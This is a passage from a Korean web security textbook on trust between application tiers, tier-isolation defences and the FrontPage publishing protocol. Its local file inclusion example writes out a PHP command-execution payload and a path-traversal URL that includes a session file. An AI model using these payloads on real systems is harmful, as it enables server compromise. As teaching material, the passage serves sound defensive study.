- **비슷하게, 애플리케이션 컴포넌트는 민감한 동작을 수행하고 핵심 파일에 접근할 권한을 가진 강력한 운영체제 계정으로 실행되는 경우가 많다.** 이 구성에서 **운영체제 계층은 관련 애플리케이션 계층이 바람직하지 않은 동작을 하지 않으리라고 사실상 신뢰한다.** 공격자가 명령 인젝션 결함을 찾으면 장악된 애플리케이션 계층을 지탱하는 하부 운영체제를 완전히 장악할 수 있는 경우가 많다(→ 28장).

계층 간 신뢰 관계는 다른 문제도 낳는다. **한 애플리케이션 계층에 프로그래밍 오류가 있으면 그것이 다른 계층의 이상 동작으로 이어질 수 있다.** WAHH가 드는 예는 경쟁 조건이다. 애플리케이션 계층의 경쟁 조건이 백엔드 데이터베이스로 하여금 **엉뚱한 사용자의 계정 정보를 내보내게** 만든다(→ 29장).

**더 나아가, 관리자가 예기치 않은 사건이나 보안 침해를 조사할 때 신뢰하는 계층의 감사 로그는 무슨 일이 일어났는지 온전히 이해하기에 대개 불충분하다. 그 로그는 사건의 주체를 단지 "신뢰받는 계층"으로만 식별하기 때문이다.** SQL 인젝션 공격 이후 데이터베이스 로그는 공격자가 주입한 모든 질의를 기록하고 있을 수 있다. 그러나 **책임자를 판정하려면 그 사건들을 애플리케이션 계층의 로그 항목과 상호 참조해야 하고, 그 로그는 가해자를 식별하기에 적절할 수도 아닐 수도 있다**(→ 16.5).

이 마지막 항목은 15.6.5절이 full NAT에 대해 서술한 것과 같은 구조다. **식별자가 경계를 넘으며 소실되고, 소실된 식별자를 복구하려면 여러 계층의 로그를 시각으로 맞춰 붙여야 한다.** 47.11절이 마이크로서비스의 집계 로그와 추적성을 다룰 때 이 문제가 다시 나타난다.

### 15.10.4 다른 계층을 밑에서 무력화하기

**애플리케이션의 계층들이 부적절하게 분리되어 있으면, 한 계층을 장악한 공격자는 다른 계층에 구현된 보안 보호를 직접 밑에서 무력화해 그 계층이 통제를 책임지는 동작을 수행하거나 데이터에 접근할 수 있다.**

**이런 유형의 취약점은 여러 계층이 같은 물리 컴퓨터에 구현된 상황에서 자주 발생한다.** 이 아키텍처 구성은 비용이 핵심 요인인 상황에서 흔한 관행이다.

#### 복호화 알고리즘에 접근하기

**많은 애플리케이션이 애플리케이션 장악의 영향을 최소화하기 위해 민감한 사용자 데이터를 암호화한다.** PCI 같은 규제나 컴플라이언스 요구를 충족하기 위한 경우가 많다. 비밀번호는 솔트를 붙여 해시함으로써 데이터 저장소가 장악되어도 알아낼 수 없게 할 수 있지만, **애플리케이션이 대응하는 평문 값을 복구해야 하는 데이터에는 다른 접근이 필요하다.** 가장 흔한 예가 **사용자의 보안 질문**(헬프데스크와 대화식으로 검증될 수 있다)과 **결제 카드 정보**(결제 처리에 필요하다)다. 이를 위해 양방향 암호 알고리즘이 쓰인다.

**암호화를 쓸 때의 전형적 결함은 암호화 키와 암호화된 데이터 사이에 논리적 분리가 이루어지지 않는 것이다.** 기존 환경에 암호화를 도입할 때 흔히 나타나는 단순하고 결함 있는 분리는, 나머지 코드에 영향을 주지 않기 위해 **알고리즘과 관련 키를 데이터 계층 안에 두는 것**이다. **그러나 데이터 계층이 예컨대 SQL 인젝션 공격으로 장악되면, 공격자에게 복호화 함수를 찾아 실행하는 것은 간단한 한 걸음이다.**

> **주의**
>
> 암호화 과정이 무엇이든, **애플리케이션이 정보를 복호화할 수 있고 그 애플리케이션이 완전히 장악되면, 공격자는 언제나 복호화 알고리즘으로 가는 논리적 경로를 찾아낼 수 있다.**

이 상자는 이 책이 여러 곳에서 만나는 명제다. 26장이 클라이언트 사이드 통제 우회에 대해 서술하는 것과 같은 형태다. **어떤 주체가 어떤 연산을 수행할 능력을 갖고 있으면, 그 주체를 장악한 자도 그 연산을 수행할 수 있다.** 암호화가 보호하는 것은 **저장된 데이터**이지 **장악된 실행 환경**이 아니다.

#### 파일 읽기 접근으로 MySQL 데이터 추출하기

**많은 소규모 애플리케이션이 LAMP 서버 — Linux, Apache, MySQL, PHP를 한 대의 컴퓨터에서 운영하는 구성 — 를 쓴다.** 이 아키텍처에서는 **웹 애플리케이션 계층의 파일 노출 취약점**이, 그 자체로는 치명적 결함이 아닐 수 있음에도, **애플리케이션 전체 데이터에 대한 무제한 접근**으로 이어질 수 있다.

이유는 명확하다. **MySQL 데이터는 사람이 읽을 수 있는 파일에 저장되고, 웹 애플리케이션 프로세스는 흔히 그 파일을 읽을 권한을 갖고 있기 때문이다.** 데이터베이스가 자기 데이터에 엄격한 접근 통제를 구현하고 애플리케이션이 여러 저권한 계정을 나눠 써서 데이터베이스에 접속하더라도, **공격자가 데이터베이스 계층이 보관하는 데이터에 직접 접근할 수 있으면 이 보호는 통째로 밑에서 무력화된다.**

WAHH가 드는 예는 사용자가 스킨을 골라 경험을 맞춤화할 수 있는 애플리케이션이다. 이 기능은 CSS 파일을 선택하고 애플리케이션이 그것을 사용자에게 보여 주는 방식으로 동작한다. **이 기능에 경로 순회 취약점이 있으면 공격자는 그것으로 MySQL 데이터베이스가 보관하는 임의의 데이터에 직접 접근하고, 데이터베이스 계층에 구현된 통제를 밑에서 무력화하며, MySQL user 테이블에서 사용자명과 비밀번호 해시를 회수할 수 있다**(→ 28장).

**공격자가 파일 쓰기 접근을 갖고 있다면 애플리케이션의 설정에 쓰거나, 호스팅된 가상 디렉터리에 써서 명령 실행을 얻으려 시도할 수 있다.**

#### 로컬 파일 인클루전으로 명령 실행하기

**대부분의 언어에는 로컬 파일을 현재 스크립트 안에 포함시키는 함수가 있다.** 공격자가 파일 시스템의 임의 파일을 지정할 수 있다는 것은 부인할 수 없는 고위험 문제다. 그런 파일은 `/etc/passwd`일 수도, 비밀번호를 담은 설정 파일일 수도 있다. 이 경우 정보 노출의 위험은 명백하지만, 공격자가 반드시 그 공격을 시스템 장악으로 상승시킬 수 있는 것은 아니다(원격 파일 인클루전과 달리). **그러나 다른 애플리케이션·플랫폼 기능의 결과로 자기가 내용을 부분적으로 통제하는 파일을 포함시켜 명령을 실행하는 것이 여전히 가능할 수 있다.**

다음 URL에서 `country` 파라미터로 사용자 입력을 받는 애플리케이션을 보자.

```
http://eis/mdsecportal/prefs/preference_2?country=en-gb
```

사용자는 `country` 파라미터를 수정해 임의 파일을 포함시킬 수 있다. 가능한 공격 하나는 **스크립트 명령을 담은 URL을 요청해 그것이 웹 서버 로그 파일에 기록되게 한 다음, 로컬 파일 인클루전으로 그 로그 파일을 포함시키는 것**이다.

**PHP의 아키텍처적 특이점을 이용하는 흥미로운 방법이 있다. PHP 세션 변수는 세션 토큰으로 이름 붙여진 파일에 평문으로 기록된다.** 예를 들어 다음 파일은

```
/var/lib/php5/sess_9ceed0645151b31a494f4e52dabd0ed7
```

사용자가 설정한 닉네임을 포함하는 다음과 같은 내용을 담을 수 있다.

```
logged_in|i:1;id|s:2:"24";username|s:11:"manicsprout";nickname|s:22:"msp";privilege|s:1:"1";
```

**공격자는 먼저 자기 닉네임을 `<?php passthru(id); ?>` 로 설정한 다음, 로컬 파일 인클루전 동작을 이용해 자기 세션 파일을 포함시켜 `id` 명령이 실행되게 할 수 있다.**

```
http://eis/mdsecportal/prefs/preference_2.php?country=../../var/lib/php5/sess_9ceed0645151b31a494f4e52dabd0ed7%00
```

*예제 15-10. 세션 파일을 통한 로컬 파일 인클루전 명령 실행 (WAHH 17장 기준)*

**이 사례가 보여 주는 것은 계층 사이에 공유된 파일 시스템이 신뢰 경계를 지우는 방식이다.** 세션 저장은 애플리케이션 계층의 내부 구현이고, 파일 인클루전은 프레젠테이션 계층의 기능이며, 실행은 운영체제 계층에서 일어난다. 세 계층 모두에서 각각은 그럴듯하게 동작하고 있다. **문제는 세 계층이 같은 파일 시스템을 공유한다는 사실뿐이다.**

WAHH가 이 절에 붙인 두 문장이 이 장의 관점에서 중요하다.

- **이 책 전체에서 서술한 대로, 애플리케이션에서 발견한 어떤 취약점에 대해서든 그것이 목표 달성에 어떻게 악용될 수 있는지 상상력을 발휘해 생각하라. 웹 애플리케이션에 대한 수많은 성공적 해킹이 본질적으로 영향이 제한된 취약점에서 시작한다. 신뢰 관계를 악용하고 애플리케이션 다른 곳에 구현된 통제를 밑에서 무력화함으로써, 사소해 보이는 결함 하나를 심각한 침해로 활용하는 것이 가능할 수 있다.**
- **애플리케이션의 어떤 컴포넌트에서든 임의 명령 실행에 성공하고 다른 호스트로 네트워크 커넥션을 개시할 수 있다면, 네트워크 계층과 운영체제 계층에서 애플리케이션 인프라의 다른 요소를 직접 공격해 장악 범위를 확장할 방법을 고려하라.**

두 번째 문장이 15.10.2절의 세 번째 공격 범주다. 그리고 그 문장은 **애플리케이션 내부의 문제가 다시 네트워크의 문제가 되는 지점**을 가리킨다. 47.10절이 이 지점을 마이크로서비스 맥락에서 정면으로 받는다.

### 15.10.5 계층 아키텍처의 방어

**신중하게 구현되면 다계층 아키텍처는 애플리케이션의 보안을 상당히 향상시킬 수 있다. 성공적 공격의 영향을 국지화하기 때문이다.** 앞서 설명한 모든 컴포넌트가 한 컴퓨터에서 실행되는 기본 LAMP 구성에서는 어느 계층이 장악되든 애플리케이션 전체의 장악으로 이어질 가능성이 높다. **더 안전한 아키텍처에서는 한 계층의 장악이 애플리케이션 데이터와 처리에 대한 부분적 통제로 이어질 수 있으나, 그 영향은 더 제한되고 어쩌면 영향받은 계층 안에 담길 수 있다.**

방어는 세 갈래다.

#### 신뢰 관계 최소화

**가능한 한 각 계층은 무단 동작을 방어할 자기 자신의 통제를 구현해야 하고, 그 계층 자체가 막을 수 있는 보안 침해를 다른 애플리케이션 컴포넌트가 막아 주리라 신뢰해서는 안 된다.** 계층별 적용 예는 다음과 같다.

- **애플리케이션 서버 계층은 특정 리소스와 URL 경로에 대해 역할 기반 접근 통제를 강제할 수 있다.** 예를 들어 애플리케이션 서버는 `/admin` 경로에 대한 요청이 관리자 사용자로부터 왔는지 검증할 수 있다. 특정 유형의 스크립트나 정적 리소스처럼 서로 다른 종류의 리소스에 대해서도 통제를 부과할 수 있다. **이것은 웹 애플리케이션 계층 안의 특정 종류의 접근 통제 결함의 영향을 완화한다. 특정 기능에 접근할 권한이 없는 사용자의 요청이 그 계층에 도달하기 전에 차단되기 때문이다**(→ 24장).
- **데이터베이스 서버 계층은 서로 다른 사용자와 서로 다른 동작을 위해 애플리케이션이 쓸 여러 계정을 제공할 수 있다.** 인증되지 않은 사용자를 대신한 동작은 제한된 데이터 집합에 읽기 전용 접근만 허용하는 저권한 계정으로 수행할 수 있다. 인증된 사용자의 범주별로 서로 다른 데이터베이스 계정을 배정해, 사용자 역할에 맞춰 애플리케이션 데이터의 서로 다른 부분집합에 읽기·쓰기 접근을 부여할 수 있다. **이것은 많은 SQL 인젝션 취약점의 영향을 완화한다. 성공한 공격이 사용자가 애플리케이션을 의도대로 써서 정당하게 얻을 수 있는 것 이상의 접근을 낳지 않을 수 있기 때문이다.**
- **모든 애플리케이션 컴포넌트는 정상 동작에 필요한 최소 수준의 권한을 가진 운영체제 계정으로 실행될 수 있다. 이것은 그 컴포넌트 안의 명령 인젝션이나 파일 접근 결함의 영향을 완화한다.** 잘 설계되고 완전히 강화된 아키텍처에서는 이런 종류의 취약점이 공격자에게 민감한 데이터에 접근하거나 무단 동작을 수행할 유용한 기회를 전혀 제공하지 않을 수 있다.

#### 컴포넌트 분리

**가능한 한 각 계층은 다른 계층과 의도하지 않은 방식으로 상호작용하지 못하도록 분리되어야 한다.** 이 목표를 효과적으로 구현하려면 경우에 따라 서로 다른 컴포넌트를 서로 다른 물리 호스트에서 실행해야 할 수 있다.

- **서로 다른 계층은 다른 계층이 쓰는 파일에 대해 읽기·쓰기 접근을 가져서는 안 된다.** 예를 들어 **애플리케이션 계층은 데이터베이스 데이터를 저장하는 물리 파일에 어떤 접근도 가져서는 안 되고, 적절한 사용자 계정을 쓰는 데이터베이스 질의라는 의도된 방식으로만 그 데이터에 접근할 수 있어야 한다.** 15.10.4절의 MySQL 사례와 PHP 세션 파일 사례가 정확히 이 규칙의 위반이다.
- **서로 다른 인프라 컴포넌트 사이의 네트워크 수준 접근은 애플리케이션 계층들이 통신하도록 의도된 서비스만 허용하도록 필터링되어야 한다.** 예를 들어 주 애플리케이션 로직을 호스팅하는 서버는 SQL 질의를 발행하는 데 쓰이는 포트를 통해서만 데이터베이스 서버와 통신하도록 허용될 수 있다. **이 예방책은 실제로 그 서비스를 이용해 데이터베이스 계층을 공격하는 공격을 막지는 못한다. 그러나 데이터베이스 서버에 대한 인프라 수준 공격은 막고, 운영체제 수준의 장악이 조직의 더 넓은 네트워크로 번지는 것은 담아낸다.**

두 번째 항목의 마지막 두 문장을 정확히 읽어야 한다. **네트워크 필터링은 데이터 평면의 공격을 막지 못한다. 그것이 막는 것은 확산이다.** 이 구별이 이 절의 방어 전체를 관통한다. 계층 분리의 목표는 공격을 막는 것이 아니라 **국지화**하는 것이다.

#### 심층 방어 적용

사용 중인 정확한 기술에 따라, 성공적 공격의 영향을 국지화한다는 목표를 뒷받침하기 위해 아키텍처의 서로 다른 컴포넌트에 다양한 다른 보호를 구현할 수 있다.

- **모든 호스트의 기술 스택 모든 계층이 설정과 취약점 패치 양면에서 보안 강화되어야 한다.** 서버 운영체제가 안전하지 않으면, 저권한 계정으로 명령 인젝션 결함을 익스플로잇한 공격자가 권한을 상승시켜 서버를 완전히 장악할 수 있다. 다른 호스트들이 강화되어 있지 않으면 그 공격이 네트워크를 통해 전파될 수 있다. **반대로 하부 서버들이 안전하면 공격이 애플리케이션의 한두 계층 안에 완전히 담길 수 있다**(→ 12.10).
- **애플리케이션의 어느 계층에든 영속되는 민감한 데이터는 그 계층이 장악되었을 때 쉽게 노출되지 않도록 암호화되어야 한다.** 사용자 자격증명과 신용카드 번호 같은 민감 정보는 데이터베이스 안에 암호화된 형태로 저장되어야 한다. 가능한 경우 **웹 애플리케이션 계층이 보유한 데이터베이스 자격증명을 보호하기 위해 내장 보호 메커니즘을 써야 한다.** 예를 들어 ASP.NET 2.0에서는 암호화된 데이터베이스 연결 문자열을 `web.config` 파일에 저장할 수 있다(→ 46.2).

### 15.10.6 정리: 계층 경계는 신뢰 경계가 아니다

**표 15-13. 계층 간 신뢰의 형태와 그것이 깨지는 방식 (이 책의 정리)**

| 신뢰의 내용 | 신뢰하는 쪽 → 신뢰받는 쪽 | 깨지는 방식 | 신뢰를 좁히는 조치 |
|---|---|---|---|
| "접근 통제는 이미 끝났다" | 데이터베이스 → 애플리케이션 | SQL 인젝션이 애플리케이션의 단일 계정 권한 전체를 얻는다 | 사용자·동작별 DB 계정, 읽기 전용 계정 |
| "위험한 동작은 하지 않는다" | 운영체제 → 애플리케이션 | 명령 인젝션이 프로세스 권한 전체를 얻는다 | 최소 권한 OS 계정 |
| "요청은 정당한 사용자의 것이다" | 애플리케이션 → 프레젠테이션 | 접근 통제 결함, 클라이언트 측 통제 우회 | 앱 서버 계층의 경로·역할 기반 통제 |
| "이 데이터는 내부에서 왔다" | 공유 컴포넌트 → 맞춤 컴포넌트 (ASP) | 저장 프로시저 인젝션, 로그를 통한 XSS | 컴포넌트 경계에서의 재검증 |
| "파일 시스템은 내 것이다" | 데이터 계층 → 애플리케이션 계층 | 경로 순회로 DB 물리 파일 읽기, 세션 파일 인클루전 | 계층별 파일 권한, 물리 호스트 분리 |
| "복호화는 인가된 흐름에서만 일어난다" | 암호화된 데이터 → 애플리케이션 | 애플리케이션 장악 시 복호화 경로가 함께 장악된다 | 키와 데이터의 논리적 분리, 별도 신뢰 경계 |
| "이 사건의 주체는 알려져 있다" | 감사 로그 → 상위 계층 | 로그가 주체를 "신뢰받는 계층"으로만 기록한다 | 계층 간 상관 식별자, 집계 로그 |

이 표의 마지막 행을 제외한 모든 행이 같은 형태를 갖는다. **어떤 계층이 자기가 검사할 수 있는 것을 검사하지 않고 위층의 판단을 받아들인다.** 그리고 그 계층이 검사를 생략한 이유는 대개 성능이나 편의가 아니라 **"이미 검사되었으니 중복이다"** 라는 판단이다. 그 판단은 정상 흐름에서는 옳다. 공격은 정상 흐름이 아니다.

1.4절의 문장을 애플리케이션 층위로 옮기면 이렇게 된다. **계층 분할은 관심사를 나누지만 권한을 나누지 않는다.** 권한을 나누는 것은 계정, 네트워크 필터, 파일 권한, 물리적 분리라는 별도의 조치이며, 그것들은 계층을 나눈다고 자동으로 따라오지 않는다. **아키텍처 다이어그램의 상자 사이 선은 신뢰 경계가 아니다. 신뢰 경계는 그 선을 강제하는 메커니즘이 있는 곳에만 생긴다.**

> **이 책의 범위를 넘어서**
>
> 이 장이 서술한 문제 — 여러 테넌트가 하나의 인프라를 공유하는 것, 계층이 서로를 신뢰하는 것, 트래픽을 어디로 보낼지 인프라가 결정하는 것 — 는 원서 다섯 권이 쓰인 이후 새로운 어휘를 얻었다. 컨테이너와 오케스트레이션 플랫폼은 이 장의 표 15-12가 나열한 격리 층위를 재배치했고, 상용 CDN과 클라우드 로드 밸런서는 15.3절과 15.6절의 기법들을 관리형 서비스로 흡수했으며, 서비스 메시는 15.10절의 "컴포넌트 분리"와 "신뢰 관계 최소화"를 서비스 간 통신 계층의 제품 기능으로 만들었다. 이 책은 그 제품군을 다루지 않는다. 다루는 것은 그 아래에 있는 성질 — 격리를 담당하는 층은 격리되는 대상보다 아래에 있어야 하고, 계층 경계는 그것을 강제하는 메커니즘이 있을 때만 신뢰 경계가 되며, 목적지를 정하는 근거의 위조 비용이 그 구조의 강도라는 것 — 이다. 새 어휘로 옮겨 가도 이 성질들은 바뀌지 않는다. 47.7~47.11절이 마이크로서비스라는 이름으로 같은 문제를 다시 다룬다.

> **이 절이 뒷받침하는 것**
>
> - 계층 경계가 신뢰 경계가 아니라는 사실 → **1.4** (계층 경계는 신뢰 경계가 아니다), **47.10** (서비스 간 통신은 다시 네트워크다)
> - 계층 간 신뢰가 취약점의 영향을 증폭한다는 사실 → **27장** (SQL 인젝션), **28장** (명령 인젝션·경로 순회), **24장** (접근 통제)
> - 로그가 주체를 신뢰받는 계층으로만 기록한다는 사실 → **16.5** (방어자의 로그), **47.11** (마이크로서비스의 로깅)
> - 계층별 최소 권한과 컴포넌트 분리 → **15.9.6** (공유 환경의 강화), **46.2** (설정과 비밀의 분리)
> - 여기서 서술한 것의 공격자 방법론 형태 → **31.1** (계층 아키텍처 — 공격과 방어)

## 15.11 발행 시스템 — FrontPage 서버 확장, WebDAV 협업 저작

웹 페이지를 만들어 웹 서버에 올리는 일은 어떻게 하는가. 웹의 암흑기(1995년쯤이라고 하자)에는 텍스트 에디터로 HTML을 손으로 만들고 FTP로 웹 서버에 수동 업로드했다. **이 절차는 고통스럽고, 동료와 조율하기 어렵고, 특별히 안전하지도 않았다.**

현대의 발행 도구는 웹 콘텐츠를 만들고 발행하고 관리하는 일을 훨씬 편하게 만들었다. 화면에 보이는 대로 콘텐츠를 대화식으로 편집하고 한 번의 클릭으로 서버에 발행하면서, 바뀐 파일을 통지받을 수 있다. **원격 발행을 지원하는 도구 상당수는 HTTP 프로토콜의 확장을 쓴다.** 이 절은 HTTP 기반 웹 콘텐츠 발행의 두 가지 중요한 기술 — FrontPage와 DAV — 를 다룬다.

이 절을 이 장에 두는 이유가 있다. **발행은 쓰기 경로다.** 이 책이 지금까지 서술한 거의 모든 것은 읽기 경로 — `GET`으로 시작해 응답으로 끝나는 흐름 — 를 다뤘다. 15.3.4절이 지적한 대로 콘텐츠 권위로 가는 발행 경로는 그 자체가 공격 표면이며, 15.9절이 서술한 공유 환경에서 고객이 콘텐츠를 올리는 접근 메커니즘이 바로 이것이다. 이 절의 두 시스템은 **그 쓰기 경로를 HTTP 위에 올린 두 가지 방식**이며, 그 결과로 생긴 성질이 이 절의 관심사다.

### 15.11.1 FrontPage 서버 확장

**FrontPage(흔히 FP)** 는 마이크로소프트가 제공한 웹 저작·발행 툴킷이다. 최초 구상(FrontPage 1.0)은 1994년 Vermeer Technologies에서 나왔고, 웹 사이트 관리와 생성을 하나의 통합 도구로 결합한 최초의 제품으로 불렸다. 마이크로소프트가 Vermeer를 인수해 1996년 FrontPage 1.1을 출시했고, FrontPage 2002는 여섯 번째 버전이자 마이크로소프트 오피스 제품군의 핵심 구성 요소였다.

"어디서나 발행" 전략의 일환으로 마이크로소프트는 **FrontPage 서버 확장(FrontPage Server Extensions, FPSE)** 이라는 서버 측 소프트웨어 집합을 내놓았다. 이 서버 측 컴포넌트들은 웹 서버와 통합되어 웹 사이트와 FrontPage를 실행하는 클라이언트(그리고 이 확장을 지원하는 다른 클라이언트) 사이의 필요한 번역을 제공한다.

**이 책의 관심은 FP 클라이언트와 FPSE 사이의 발행 프로토콜에 있다. 이 프로토콜은 HTTP의 시맨틱을 바꾸지 않으면서 HTTP의 핵심 서비스에 확장을 설계하는 사례다.**

**FrontPage 발행 프로토콜은 HTTP `POST` 요청 위에 RPC 계층을 구현한다.** 이를 통해 FrontPage 클라이언트는 서버에 명령을 보내 웹 사이트의 문서를 갱신하고, 검색을 수행하고, 웹 저작자들 사이에서 협업할 수 있다.

**웹 서버는 FPSE를 향한 `POST` 요청을 보고 그 요청들을 그에 맞게 보낸다**(마이크로소프트 IIS가 아닌 서버에서 FPSE는 CGI 프로그램의 집합으로 구현된다). **그리고 중간의 방화벽과 프록시 서버가 `POST` 메서드를 허용하도록 설정되어 있는 한, FrontPage는 서버와 계속 통신할 수 있다.**

마지막 문장은 원서가 기능의 장점으로 서술한 것이다. 이 책의 관점에서 그것은 **경계 장비가 저작 트래픽과 열람 트래픽을 구별할 수 없다**는 뜻이다. 이 성질로 돌아오기 전에 프로토콜을 마저 보자.

#### FrontPage 어휘

- **가상 서버(virtual server)** — 같은 서버에서 실행되는 여러 웹 사이트 중 하나. 각각 고유한 도메인 이름과 IP 주소를 갖는다. 본질적으로 가상 서버는 하나의 웹 서버가 여러 웹 사이트를 호스팅하되 각각이 브라우저에게 자기만의 웹 서버에 호스팅되는 것처럼 보이게 한다. 가상 서버를 지원하는 웹 서버를 **다중 호스팅(multi-hosting) 웹 서버**라 하고, 여러 IP 주소로 설정된 기계를 **다중 홈(multi-homed) 서버**라 한다(→ 15.2).
- **루트 웹(root web)** — 웹 서버의 기본 최상위 콘텐츠 디렉터리. 다중 호스팅 환경에서는 가상 웹 서버의 최상위 콘텐츠 디렉터리다. 루트 웹에 접근하려면 페이지 이름 없이 서버의 URL만 지정하면 된다. **웹 서버당 루트 웹은 하나뿐이다.**
- **서브웹(subweb)** — 루트 웹이나 다른 서브웹의 이름 붙은 하위 디렉터리로서 그 자체가 완전한 FPSE 확장 웹이다. **서브웹은 자기 관리 권한과 저작 권한을 스스로 지정할 수 있는 완전히 독립적인 개체가 될 수 있다.** 또한 서브웹은 검색 같은 메서드에 대해 범위를 제공할 수 있다.

#### FrontPage RPC 프로토콜

FrontPage 클라이언트와 FPSE는 독자적 RPC 프로토콜로 통신한다. **이 프로토콜은 RPC 메서드와 관련 변수를 `POST` 요청의 본문에 담는 방식으로 HTTP `POST` 위에 얹혀 있다.**

과정을 시작하려면 클라이언트는 서버에 있는 대상 프로그램(FPSE 패키지 중 `POST` 요청을 실행할 수 있는 부분)의 위치와 이름을 알아내야 한다. 그래서 특별한 `GET` 요청을 보낸다.

```
GET /_vti_inf.html HTTP/1.1
Date: Sat, 12 Aug 2000 20:31:24 GMT
User-agent: Mozilla/2.0 (compatible; MS FrontPage 4.0)
Host: taskserver:80
Accept: auth/sicily
Content-length: 0
```

*예제 15-11. FPSE에 대한 최초 요청 (HTTP-DG 그림 19-2 기준)*

파일이 반환되면 FrontPage 클라이언트는 응답을 읽어 `FPShtmlScriptUrl`, `FPAuthorScriptUrl`, `FPAdminScriptUrl`에 연결된 값을 찾는다. 전형적으로 다음과 같다.

```
FPShtmlScriptUrl="_vti_bin/_vti_rpc/shtml.dll"
FPAuthorScriptUrl="_vti_bin/_vti_aut/author.dll"
FPAdminScriptUrl="_vti_bin/_vti_adm/admin.dll"
```

`FPShtmlScriptUrl`은 **"열람 시점(browse time)"** 명령(예: FPSE 버전 조회)을 실행하기 위해 어디로 `POST`할지 알려 준다. `FPAuthorScriptUrl`은 **"저작 시점(authoring time)"** 명령을, `FPAdminScriptUrl`은 **관리 동작**을 어디로 `POST`할지 알려 준다.

`POST` 요청의 본문은 `method=<command>` 형태의 RPC 명령과 필요한 파라미터를 담는다. 문서 목록을 요청하는 RPC 메시지는 다음과 같다.

```
POST /_vti_bin/_vti_aut/author.dll HTTP/1.1
Date: Sat, 12 Aug 2000 20:32:54 GMT
User-Agent: MSFrontPage/4.0
...

method=list+documents%3a4%2e0%2e2%2e3717&service%5fname=&listHiddenDocs=false&list
ExplorerDocs=false&listRecurse=false&listFiles=true&listFolders=true&listLinkInfo=
true&listIncludeParent=true&listDerived=false&listBorders=false&listChildWebs=true
&initialUrl=&folderList=%5b%3bTW%7c12+Aug+2000+20%3a33%3a04+%2d0000%5d
```

*예제 15-12. FPSE로 보내는 RPC 명령 (HTTP-DG 19장 기준)*

CGI 프로그램에서와 마찬가지로 메서드 안의 공백은 더하기(`+`)로 인코딩되고, 다른 모든 비영숫자 문자는 `%XX` 형식(`XX`는 문자의 ASCII 표현)으로 인코딩된다. 읽기 쉽게 풀면 이렇다.

```
method=list+documents:4.0.2.3717
&service_name=
&listHiddenDocs=false
&listExplorerDocs=false
...
```

주요 요소는 다음과 같다.

- `service_name` — 메서드가 작용할 웹 사이트의 URL. 기존 폴더이거나 기존 폴더의 한 단계 아래여야 한다.
- `listHiddenDocs` — 값이 `true`이면 웹의 숨은 문서를 보여 준다. **"숨은" 문서는 경로 컴포넌트가 `_`로 시작하는 URL로 지정된다.**
- `listExplorerDocs` — 값이 `true`이면 작업 목록을 나열한다.

FPSE는 `list+documents` 요청을 처리하고 필요한 정보를 반환한다.

```
HTTP/1.1 200 OK
Server: Microsoft-IIS/5.0
Date: Sat, 12 Aug 2000 22:49:50 GMT
Content-type: application/x-vermeer-rpc
X-FrontPage-User-Name: IUSER_MINSTAR

<html><head><title>RPC packet</title></head>
<body>
<p>method=list documents: 4.0.2.3717
<p>document_list=
<ul>
     <li>document_name=help.gif
</ul>
```

*예제 15-13. FPSE의 응답 (HTTP-DG 19장 기준)*

응답에서 보듯 웹 서버에서 이용 가능한 문서의 서식화된 목록이 FP 클라이언트에게 반환된다.

#### FrontPage 보안 모델

**웹 서버 콘텐츠에 직접 접근하는 발행 시스템은 그 동작의 보안 함의를 매우 의식해야 한다. 대부분의 경우 FPSE는 보안 제공을 웹 서버에 의존한다.**

FPSE 보안 모델은 세 종류의 사용자를 정의한다. **관리자(administrators), 저작자(authors), 열람자(browsers)** 이며 관리자가 완전한 통제권을 갖는다. **모든 권한은 누적적이다.** 즉 모든 관리자는 FrontPage 웹을 저작하고 열람할 수 있고, 모든 저작자는 열람 권한을 갖는다.

관리자·저작자·열람자의 목록은 주어진 FPSE 확장 웹에 대해 정의된다. **모든 서브웹은 루트 웹으로부터 권한을 상속하거나 자기 권한을 설정할 수 있다.**

IIS가 아닌 웹 서버에서는 모든 FPSE 프로그램이 "실행 가능(executable)"으로 표시된 디렉터리에 저장되어야 한다(다른 CGI 프로그램과 같은 제약이다). FrontPage 서버 관리 유틸리티인 `Fpsrvadm`을 이 목적에 쓸 수 있다. IIS 서버에서는 통합 윈도 보안 모델이 우세하다.

IIS가 아닌 서버에서는 웹 서버의 접근 통제 메커니즘이 주어진 프로그램에 접근할 수 있는 사용자를 지정한다. Apache와 NCSA 웹 서버에서 그 파일 이름은 `.htaccess`이고, 넷스케이프 서버에서는 `.nsconfig`다. **이 접근 파일은 사용자·그룹·IP 주소를 여러 수준의 권한 — `GET`(읽기), `POST`(실행) 등 — 과 연결한다.** 예를 들어 Apache 웹 서버에서 어떤 사용자가 저작자가 되려면 `.htaccess` 파일이 그 사용자에게 `author.exe`로 `POST`할 것을 허용해야 한다. 이 접근 명세 파일은 흔히 디렉터리 단위로 정의되어 권한 정의에 더 큰 유연성을 제공한다(→ 12.4).

IIS 서버에서는 주어진 루트 또는 서브루트에 대한 ACL에 대해 권한이 검사된다. IIS는 요청을 받으면 먼저 로그온해 사용자를 가장(impersonate)한 다음 요청을 세 확장 DLL 중 하나로 보낸다. **DLL은 가장 자격증명을 대상 폴더에 정의된 ACL과 대조해 검사한다.** 검사가 성공하면 확장 DLL이 요청된 동작을 실행하고, 그렇지 않으면 "권한 거부" 메시지가 클라이언트에게 반환된다. 윈도 보안과 IIS의 긴밀한 통합 덕분에 사용자 관리자(User Manager)로 세밀한 통제를 정의할 수 있다.

**그리고 원서는 이 정교한 보안 모델에 대해 다음과 같이 결론짓는다.**

> **이 정교한 보안 모델에도 불구하고 FPSE를 활성화하는 것은 사소하지 않은 보안 위험으로 악명을 얻었다. 대부분의 경우 이것은 웹 사이트 관리자들이 채택한 부주의한 관행 때문이다. 그러나 초기 버전의 FPSE에는 실제로 심각한 보안 허점이 있었고, 그것이 보안 위험이라는 일반적 인식에 기여했다. 이 문제는 엄격한 보안 모델을 온전히 구현하는 데 필요한 난해한 관행 때문에 더 악화되었다.**

#### 이 책의 관점: FPSE의 세 가지 구조적 성질

원서의 평가 — "대부분은 관리자의 부주의한 관행 때문" — 를 그대로 받아들이면 배울 것이 없다. 왜 부주의가 그렇게 흔했는지를 프로토콜의 구조에서 읽어야 한다. 세 가지가 있다.

